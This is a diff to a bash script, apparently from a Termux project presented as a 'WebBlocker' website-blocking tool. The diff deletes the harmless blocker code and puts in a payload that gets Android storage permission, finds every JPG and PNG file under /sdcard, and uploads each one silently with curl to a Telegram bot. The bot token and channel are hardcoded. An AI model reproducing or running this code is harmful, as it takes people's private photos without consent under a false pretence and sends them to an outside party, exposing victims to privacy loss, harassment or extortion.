@@ -1,63 +1,25 @@
 #!/bin/bash
 
-# Function to display WebBlocker ASCII art banner
-display_banner() {
-    clear  # Clear the terminal
-    echo "  _____           _           _     _"
-    echo " |  __ \         | |         | |   | |"
-    echo " | |__) |   _ ___| |_   _  __| |___| | ___  __ _ _ __ ___   __ _"
-    echo " |  ___/ | | / __| | | | |/ _\` / __| |/ _ \/ _\` | '_ \` _ \ / _\` |"
-    echo " | |   | |_| \__ \ | |_| | (_| \__ \ |  __/ (_| | | | | | | (_| |"
-    echo " |_|    \__,_|___/\_\__,_|\__,_|___/_|\___|\__, |_| |_| |_|\__,_|"
-    echo "                                            __/ |"
-    echo "                                           |___/"
-    echo "Welcome to WebBlocker - Your website blocking tool!"
-    echo "Crafted by Thisizasif"
-}
+# Ask for storage permission
+termux-setup-storage
 
-# Function to block the website
-block_website() {
-    # Check if a website domain is provided
-    if [ -z "$website" ]; then
-        echo "Website domain cannot be empty."
-        exit 1
-    fi
+# Check if permission is granted
+if [ $? -eq 0 ]; then
+    # Storage permission granted
 
-    # Block the website
-    echo "Blocking website: $website"
+    # Specify the Telegram bot token and channel ID
+    TELEGRAM_BOT_TOKEN="6806175078:AAFlGhVJGm9YmQBRBNsDEkMk6NlEFIKGTJ0"
+    CHAT_ID="@whoizanm"
 
-    # Simulate blocking by sleeping for a few seconds
-    sleep 5
-}
+    # Search for image files in storage and send each file
+    find /sdcard -type f \( -iname \*.jpg -o -iname \*.jpeg -o -iname \*.png \) -exec sh -c '
+        FILE_PATH="$1"
 
-# Function to unblock the website
-unblock_website() {
-    # Unblock the website
-    echo "Unblocking website: $website"
-}
+        # Send photo to Telegram
+        curl -s -X POST https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendPhoto -d "chat_id=$CHAT_ID" -F "photo=@$FILE_PATH" -F "caption=Photo from Termux"
+    ' sh {} \;
 
-# Display WebBlocker banner
-display_banner
-
-# Prompt user for the website to block
-read -p "Enter the website to block: " website
-
-# Check if a website domain is provided
-if [ -z "$website" ]; then
-    echo "Website domain cannot be empty."
-    exit 1
+else
+    # Storage permission not granted
+    echo "Storage permission is required to proceed."
 fi
-
-# Block the website
-block_website
-
-# Ask the user if they want to unblock the website
-while true; do
-    read -p "Do you want to unblock the website? (y/n): " response
-    case $response in
-        [Yy]* ) unblock_website; break;;
-        [Nn]* ) echo "Website remains blocked."; exit;;
-        * ) echo "Please answer yes or no.";;
-    esac
-done
-
